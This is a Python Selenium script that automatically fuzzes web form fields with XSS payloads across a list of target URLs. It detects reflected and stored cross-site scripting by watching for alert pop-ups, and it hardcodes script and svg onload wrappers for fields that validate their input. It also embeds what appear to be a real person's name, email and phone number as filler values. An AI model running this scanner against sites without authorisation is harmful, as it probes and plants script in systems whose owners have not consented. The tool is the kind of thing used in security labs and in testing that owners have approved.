#!/usr/bin/env python3
import argparse
import sys
import time
import threading
from queue import Queue
from tqdm import tqdm
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException, UnexpectedAlertPresentException, NoAlertPresentException
from webdriver_manager.chrome import ChromeDriverManager

print_lock = threading.Lock()
memory_lock = threading.Lock()

SUCCESSFUL_PATTERNS = []

VALIDATION_ERRORS = [
    "invalid email", "please enter a valid", "format is incorrect", 
    "must be a valid", "enter a valid url", "invalid website",
    "syntax error", "bad request", "fields validation failed"
]

def log_message(prefix, message, color_code):
    with print_lock:
        tqdm.write(f"\033[{color_code}m[{prefix}] {message}\033[0m")

def init_driver(headless):
    chrome_options = Options()
    if headless:
        chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--log-level=3")
    service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=service, options=chrome_options)

def identify_input_profile(element):
    attributes = [
        (element.get_attribute("name") or "").lower(),
        (element.get_attribute("id") or "").lower(),
        (element.get_attribute("placeholder") or "").lower(),
        (element.get_attribute("type") or "").lower()
    ]
    combined = " ".join(attributes)
    
    if "search" in combined or "query" in combined or "q" in attributes[0]:
        return "search"
    elif "phone" in combined or "tel" in combined or "mobile" in combined:
        return "phone"
    elif "email" in combined or "mail" in combined:
        return "email"
    elif "url" in combined or "web" in combined or "site" in combined or "link" in combined:
        return "website"
    elif "user" in combined or "login" in combined:
        return "username"
    elif "comment" in combined or "msg" in combined or "message" in combined or "textarea" in combined:
        return "comment"
    return "name"

def generate_safe_dummy(profile):
    if profile == "phone":
        return "9624697202"
    elif profile == "email":
        return "kingstar75114@gmail.com"
    elif profile == "website":
        return "https://cyberprotectors.local"
    elif profile == "username":
        return "tehan_protector"
    elif profile == "comment":
        return "This is a clean security verification statement entry."
    elif profile == "search":
        return "audit_queries"
    return "Tehan Sherasiya"

def adapt_payload_for_profile(payload, profile):
    payload_clean = payload.strip()
    if profile == "email":
        if "@" not in payload_clean:
            return f"tehanxss\"><svg/onload=alert(1)>@gmail.com"
    elif profile == "website":
        if not payload_clean.startswith("http"):
            return f"https://cyberprotectors.local/?q=\"><script>alert(1)</script>"
    return payload_clean

def check_page_for_errors(driver):
    try:
        source_content = driver.page_source.lower()
        for error_indicator in VALIDATION_ERRORS:
            if error_indicator in source_content:
                return True
    except:
        pass
    return False

def find_submit_element(driver):
    for selectors in ["input[type='submit']", "button[type='submit']", "button", "input[type='button']"]:
        buttons = driver.find_elements(By.CSS_SELECTOR, selectors)
        if buttons:
            return buttons[0]
    return None

def check_and_log_alert(driver, target_url, field_type, injected_payload):
    try:
        alert = driver.switch_to.alert
        alert_text = alert.text
        
        log_message("VULNERABLE", "═"*60, "32")
        log_message("VULNERABLE", f"💥 XSS CONFIRMED!", "32")
        log_message("VULNERABLE", f"📍 TARGET PAGE : {target_url}", "32")
        log_message("VULNERABLE", f"🎯 FIELD TYPE  : [{field_type.upper()}]", "32")
        log_message("VULNERABLE", f"🔥 EXPLORE POC : {injected_payload}", "32")
        log_message("VULNERABLE", "═"*60, "32")
        
        with memory_lock:
            if injected_payload not in SUCCESSFUL_PATTERNS:
                SUCCESSFUL_PATTERNS.append(injected_payload)
        alert.accept()
        return True
    except NoAlertPresentException:
        pass
    except UnexpectedAlertPresentException:
        try:
            alert = driver.switch_to.alert
            alert.accept()
        except:
            pass
        log_message("VULNERABLE", f"💥 XSS Confirmed via Background Context Trigger on {target_url}", "32")
        return True
    except:
        pass
    return False

def process_form_fuzzing(driver, target_url, payloads, pbar, log_negative):
    try:
        driver.get(target_url)
    except UnexpectedAlertPresentException:
        # Agar load hote hi pre-stored XSS pop up aa jaye to handle karein
        check_and_log_alert(driver, target_url, "PRE-STORED / CACHED CONTEXT", "Existing DB Payload")
    except Exception as e:
        log_message("ERROR", f"Could not open target url context: {e}", "31")
        return

    # Safe element mapping loop setup
    try:
        input_elements = driver.find_elements(By.CSS_SELECTOR, "input:not([type='hidden']):not([type='submit']), textarea, [role='search'] input")
    except UnexpectedAlertPresentException:
        check_and_log_alert(driver, target_url, "PRE-STORED / CACHED CONTEXT", "Existing DB Payload")
        input_elements = driver.find_elements(By.CSS_SELECTOR, "input:not([type='hidden']):not([type='submit']), textarea, [role='search'] input")

    if not input_elements:
        try:
            input_elements = driver.find_elements(By.TAG_NAME, "input")
        except UnexpectedAlertPresentException:
            check_and_log_alert(driver, target_url, "PRE-STORED / CACHED CONTEXT", "Existing DB Payload")
            input_elements = driver.find_elements(By.TAG_NAME, "input")
            
        if not input_elements:
            return

    form_map = []
    for idx, el in enumerate(input_elements):
        try:
            profile = identify_input_profile(el)
            form_map.append({"index": idx, "profile": profile, "element": el})
        except:
            pass
    
    if not form_map:
        return

    log_message("MAP", f"Mapped {len(form_map)} parameters for structural evaluation on target.", "34")

    priority_order = ["search", "name", "phone", "email", "website", "username", "comment"]
    sorted_form_map = sorted(form_map, key=lambda x: priority_order.index(x["profile"]) if x["profile"] in priority_order else 99)

    with memory_lock:
        working_payloads = list(SUCCESSFUL_PATTERNS) + [p for p in payloads if p not in SUCCESSFUL_PATTERNS]

    for target_field in sorted_form_map:
        log_message("STRATEGY", f"Auditing field block type context: [{target_field['profile'].upper()}]", "36")
        
        is_field_strict = False
        try:
            driver.get(target_url)
            fresh_inputs = driver.find_elements(By.CSS_SELECTOR, "input:not([type='hidden']):not([type='submit']), textarea, [role='search'] input")
            if not fresh_inputs: fresh_inputs = driver.find_elements(By.TAG_NAME, "input")
            
            for current_field in form_map:
                field_el = fresh_inputs[current_field["index"]]
                if current_field["index"] == target_field["index"]:
                    field_el.send_keys("tehan_probe'\"<><")
                else:
                    field_el.send_keys(generate_safe_dummy(current_field["profile"]))
            
            submit_btn = find_submit_element(driver)
            if submit_btn: submit_btn.click()
            else: fresh_inputs[target_field["index"]].submit()
            
            if check_page_for_errors(driver):
                log_message("SMART ALERT", f"Strict validation detected on [{target_field['profile'].upper()}]. Activating structural wrappers.", "33")
                is_field_strict = True
        except UnexpectedAlertPresentException:
            check_and_log_alert(driver, target_url, target_field["profile"], "Probe Action Alert")
        except:
            pass

        for payload in working_payloads:
            if not payload.strip(): continue
                
            time.sleep(1.0) # Precise 1 Request Per Second regulator rule
            pbar.update(1)

            final_payload = adapt_payload_for_profile(payload, target_field["profile"]) if is_field_strict else payload

            try:
                driver.get(target_url)
                fresh_inputs = driver.find_elements(By.CSS_SELECTOR, "input:not([type='hidden']):not([type='submit']), textarea, [role='search'] input")
                if not fresh_inputs: fresh_inputs = driver.find_elements(By.TAG_NAME, "input")
                
                for current_field in form_map:
                    field_element = fresh_inputs[current_field["index"]]
                    try: field_element.clear()
                    except: pass
                        
                    if current_field["index"] == target_field["index"]:
                        field_element.send_keys(final_payload)
                    else:
                        field_element.send_keys(generate_safe_dummy(current_field["profile"]))

                submit_btn = find_submit_element(driver)
                if submit_btn: submit_btn.click()
                else: fresh_inputs[target_field["index"]].submit()

                # Phase 1 Check
                if check_and_log_alert(driver, target_url, target_field["profile"], final_payload):
                    continue

                # Phase 2 Check
                time.sleep(0.5)
                if check_and_log_alert(driver, target_url, target_field["profile"], final_payload):
                    continue
                
                # Phase 3 Check
                if target_field["profile"] == "comment":
                    try:
                        driver.get(target_url)
                        check_and_log_alert(driver, target_url, target_field["profile"], final_payload)
                    except:
                        pass

            except UnexpectedAlertPresentException:
                check_and_log_alert(driver, target_url, target_field["profile"], final_payload)
            except WebDriverException:
                pass
            except Exception as e:
                pass

def scan_worker(url_queue, payloads, timeout, headless, log_negative, pbar):
    driver = None
    try:
        driver = init_driver(headless)
        driver.set_page_load_timeout(timeout)
    except Exception as e:
        log_message("FATAL", f"WebDriver instantiation failed: {e}", "31")
        return

    while not url_queue.empty():
        try:
            target_url = url_queue.get_nowait()
        except:
            break
            
        process_form_fuzzing(driver, target_url, payloads, pbar, log_negative)
        url_queue.task_done()

    if driver:
        driver.quit()

def main():
    parser = argparse.ArgumentParser(description="Context-Aware Dynamic Input Verification Engine")
    parser.add_argument("--url", help="Target URL pathways logs mappings blueprints")
    parser.add_argument("--file", help="File containing collection lists targets parameters")
    parser.add_argument("--payloads", required=True, help="Path to payloads data logs sequences files")
    parser.add_argument("--timeout", type=int, default=7, help="Selenium global load threshold windows limits")
    parser.add_argument("--threads", type=int, default=1, help="Simultaneous processing pipeline worker arrays bounds")
    parser.add_argument("--negative", type=str, default="false", choices=["true", "false"])
    parser.add_argument("--view", type=str, default="off", choices=["on", "off"])

    args = parser.parse_args()

    try:
        with open(args.payloads, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] Missing input evaluation database elements: {e}")
        sys.exit(1)

    targets = []
    if args.url: targets.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Missing operational endpoints configuration logs: {e}")
            sys.exit(1)

    url_queue = Queue()
    for t in targets: url_queue.put(t)

    headless = True if args.view == "off" else False
    log_negative = True if args.negative == "true" else False

    estimated_total_operations = len(targets) * len(payloads) * 2 
    
    print(f"[*] Engine Control: PortSwigger Lab Dom Analyzer Ready.")
    print(f"[*] System Tracker: Stored & Blind Check Verification Monitors Up.")
    print(f"[*] Speed Core Regulator: Hard locked exactly to 1 Request Per Second.")
    
    with tqdm(total=estimated_total_operations, desc="Scanning Pipeline", unit="req", dynamic_ncols=True) as pbar:
        threads_list = []
        for _ in range(min(args.threads, len(targets))):
            t = threading.Thread(target=scan_worker, args=(url_queue, payloads, args.timeout, headless, log_negative, pbar))
            t.start()
            threads_list.append(t)

        for t in threads_list:
            t.join()

    print("\n[*] Auditing routines processed fully.")

if __name__ == "__main__":
    main()
